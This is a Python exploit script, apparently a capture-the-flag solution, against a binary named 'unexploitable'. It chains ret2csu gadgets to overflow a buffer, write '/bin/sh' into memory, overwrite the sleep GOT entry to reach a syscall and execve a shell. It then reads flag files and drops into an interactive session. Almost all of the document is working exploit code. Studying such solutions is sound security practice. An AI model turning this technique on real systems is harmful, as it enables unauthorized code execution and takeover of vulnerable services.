#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.6", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
exe = context.binary = ELF('./unexploitable_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(1)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *0x400577
c
'''

p = start()

# ==================== EXPLOIT ====================

def ret2csu(rbx, rbp, r12, r13, r14, r15, ret):

    payload = flat(
        [
            0,          # rsp + 0x0
            rbx,        # rsp + 0x8
            rbp,        # rsp + 0x10
            r12,        # rsp + 0x18
            r13,        # rsp + 0x20
            r14,        # rsp + 0x28
            r15,        # rsp + 0x30
            ret         # rsp + 0x38
        ]
    )

    return payload


def exploit():


    offset = 0x18
    csu_gadget1 = 0x4005e6 # mov rbx, qword [rsp+0x08]; mov rbp, qword [rsp+0x10]; mov r12, qword [rsp+0x18]; mov r13, qword [rsp+0x20]; mov r14, qword [rsp+0x28]; mov r15, qword [rsp+0x30]; add rsp, 0x38; ret; 
    csu_gadget2 = 0x4005d0 # mov rdx,r15; mov rsi,r14; mov edi,r13d; call QWORD PTR [r12+rbx*8]; add rbx,0x1; cmp rbx,rbp; jne 0x4005d0 <__libc_csu_init+80>
    bss = 0x601800
    main = exe.sym.main
    read_got = exe.got['read']
    sleep_got = exe.got['sleep']

    # call = r12
    # rdi = r13
    # rsi = r14
    # rdx = r15

    payload = b'A'*offset
    payload += p64(csu_gadget1)
    payload += ret2csu(0, 1, read_got, 0, bss+0x100, 0x8, csu_gadget2)
    payload += ret2csu(0, 0, 0, 0, 0,0, main)

    sleep(3)
    input("Payload 1")
    s(payload)

    input("Read /bin/sh string")
    s(b'/bin/sh\0')

    payload = b'B'*offset
    payload += p64(csu_gadget1)
    payload += ret2csu(0, 1, read_got, 0, sleep_got, 0x1, csu_gadget2)       
    payload += ret2csu(0, 1, read_got, 0, bss, 0x3b, csu_gadget2)            
    payload += ret2csu(0, 1, sleep_got, bss+0x100, 0, 0, csu_gadget2)

    sleep(3)
    input("Payload 2")
    s(payload)

    input("Overwrite sleep_got")
    s(p8(0xde))

    input("Call execve")
    s(b'C'*0x3b)

    sl(b'cat /home/unexploitable/f*')

    interactive()

if __name__ == '__main__':
    exploit()
